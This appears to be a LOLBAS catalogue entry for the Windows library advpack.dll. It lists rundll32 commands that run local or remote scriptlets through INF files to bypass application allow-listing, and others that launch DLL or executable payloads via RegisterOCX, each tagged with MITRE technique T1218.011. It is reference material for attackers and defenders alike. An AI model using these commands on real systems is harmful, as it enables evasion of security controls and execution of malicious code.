---
Name: Advpack.dll
Description: Utility for installing software and drivers with rundll32.exe
Author:
Created: 2018-05-25
Commands:
  - Command: rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
    Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).
    Usecase: Run local or remote script(let) code through INF file specification.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows
  - Command: rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,,1,
    Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).
    Usecase: Run local or remote script(let) code through INF file specification.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows
  - Command: rundll32.exe advpack.dll,RegisterOCX test.dll
    Description: Launch a DLL payload by calling the RegisterOCX function.
    Usecase: Load a DLL payload.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows
  - Command: rundll32.exe advpack.dll,RegisterOCX calc.exe
    Description: Launch an executable by calling the RegisterOCX function.
    Usecase: Run an executable payload.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows
  - Command: rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"
    Description: Launch command line by calling the RegisterOCX function.
    Usecase: Run an executable payload.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows 10
Full_Path:
  - Path: c:\windows\system32\advpack.dll
  - Path: c:\windows\syswow64\advpack.dll
Code_Sample:
  - Code: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Advpack.inf
  - Code: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Advpack_calc.sct
Detection:
  - IOC:
Resources:
  - Link: https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
  - Link: https://twitter.com/ItsReallyNick/status/967859147977850880
  - Link: https://twitter.com/bohops/status/974497123101179904
  - Link: https://twitter.com/moriarty_meng/status/977848311603380224
Acknowledgement:
  - Person: Jimmy (LaunchINFSection)
    Handle: '@bohops'
  - Person: Fabrizio (RegisterOCX - DLL)
    Handle: '@0rbz_'
  - Person: Moriarty (RegisterOCX - CMD)
    Handle: '@moriarty_meng'
  - Person: Nick Carr (Threat Intel)
    Handle: '@ItsReallyNick'
---
